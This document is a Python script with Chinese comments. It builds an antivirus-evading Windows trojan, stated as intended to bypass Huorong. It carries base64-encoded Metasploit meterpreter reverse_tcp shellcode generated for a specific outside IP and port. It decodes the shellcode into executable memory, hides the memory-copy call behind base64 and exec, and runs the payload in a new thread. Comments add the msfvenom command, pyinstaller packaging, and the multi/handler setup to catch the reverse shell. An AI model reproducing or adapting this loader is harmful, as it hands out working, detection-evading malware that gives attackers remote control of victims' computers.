# 在centos2的机器上通过msf生成base64加密后的木马
# msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 lhost=110.42.178.227 lport=3333 -f c

# msf 生成 免杀 火绒的 木马
#通过windows机器的python执行下列代码生成免杀的py
import ctypes
import base64

encode_shellcode = '''
\x2f\x4f\x69\x50\x41\x41\x41\x41\x59\x49\x6e\x6c\x4d\x64\x4a
\x6b\x69\x31\x49\x77\x69\x31\x49\x4d\x69\x31\x49\x55\x4d\x66
\x2b\x4c\x63\x69\x67\x50\x74\x30\x6f\x6d\x4d\x63\x43\x73\x50
\x47\x46\x38\x41\x69\x77\x67\x77\x63\x38\x4e\x41\x63\x64\x4a
\x64\x65\x39\x53\x56\x34\x74\x53\x45\x49\x74\x43\x50\x41\x48
\x51\x69\x30\x42\x34\x68\x63\x42\x30\x54\x41\x48\x51\x55\x49
\x74\x49\x47\x49\x74\x59\x49\x41\x48\x54\x68\x63\x6c\x30\x50
\x44\x48\x2f\x53\x59\x73\x30\x69\x77\x48\x57\x4d\x63\x43\x73
\x77\x63\x38\x4e\x41\x63\x63\x34\x34\x48\x58\x30\x41\x33\x33
\x34\x4f\x33\x30\x6b\x64\x65\x42\x59\x69\x31\x67\x6b\x41\x64
\x4e\x6d\x69\x77\x78\x4c\x69\x31\x67\x63\x41\x64\x4f\x4c\x42
\x49\x73\x42\x30\x49\x6c\x45\x4a\x43\x52\x62\x57\x32\x46\x5a
\x57\x6c\x48\x2f\x34\x46\x68\x66\x57\x6f\x73\x53\x36\x59\x44
\x2f\x2f\x2f\x39\x64\x61\x44\x4d\x79\x41\x41\x42\x6f\x64\x33
\x4d\x79\x58\x31\x52\x6f\x54\x48\x63\x6d\x42\x34\x6e\x6f\x2f
\x39\x43\x34\x6b\x41\x45\x41\x41\x43\x6e\x45\x56\x46\x42\x6f
\x4b\x59\x42\x72\x41\x50\x2f\x56\x61\x67\x70\x6f\x62\x69\x71
\x79\x34\x32\x67\x43\x41\x41\x30\x46\x69\x65\x5a\x51\x55\x46
\x42\x51\x51\x46\x42\x41\x55\x47\x6a\x71\x44\x39\x2f\x67\x2f
\x39\x57\x58\x61\x68\x42\x57\x56\x32\x69\x5a\x70\x58\x52\x68
\x2f\x39\x57\x46\x77\x48\x51\x4b\x2f\x30\x34\x49\x64\x65\x7a
\x6f\x5a\x77\x41\x41\x41\x47\x6f\x41\x61\x67\x52\x57\x56\x32
\x67\x43\x32\x63\x68\x66\x2f\x39\x57\x44\x2b\x41\x42\x2b\x4e
\x6f\x73\x32\x61\x6b\x42\x6f\x41\x42\x41\x41\x41\x46\x5a\x71
\x41\x47\x68\x59\x70\x46\x50\x6c\x2f\x39\x57\x54\x55\x32\x6f
\x41\x56\x6c\x4e\x58\x61\x41\x4c\x5a\x79\x46\x2f\x2f\x31\x59
\x50\x34\x41\x48\x30\x6f\x57\x47\x67\x41\x51\x41\x41\x41\x61
\x67\x42\x51\x61\x41\x73\x76\x44\x7a\x44\x2f\x31\x56\x64\x6f
\x64\x57\x35\x4e\x59\x66\x2f\x56\x58\x6c\x37\x2f\x44\x43\x51
\x50\x68\x58\x44\x2f\x2f\x2f\x2f\x70\x6d\x2f\x2f\x2f\x2f\x77
\x48\x44\x4b\x63\x5a\x31\x77\x63\x4f\x37\x38\x4c\x57\x69\x56
\x6d\x6f\x41\x55\x2f\x2f\x56
'''

shellcode = base64.b64decode(encode_shellcode.replace('\n', ''))
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
# ctypes.windll.kernel32.RtlMoveMemory(rwxpage,ctypes.create_string_buffer(shellcode),len(shellcode))
func = 'Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsY3R5cGVzLmNyZWF0ZV9zdHJpbmdfYnVmZmVyKHNoZWxsY29kZSksbGVuKHNoZWxsY29kZSkp'
func = base64.b64decode(func)
exec(func)
handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

# 在msf上监听，等待shell的反弹
# pyinstall -F -w ms_hr.py
# use exploit/multi/handler
# set payload windows/meterpreter/reverse_tcp
# set lhost 0.0.0.0
# set lport 3344
# run
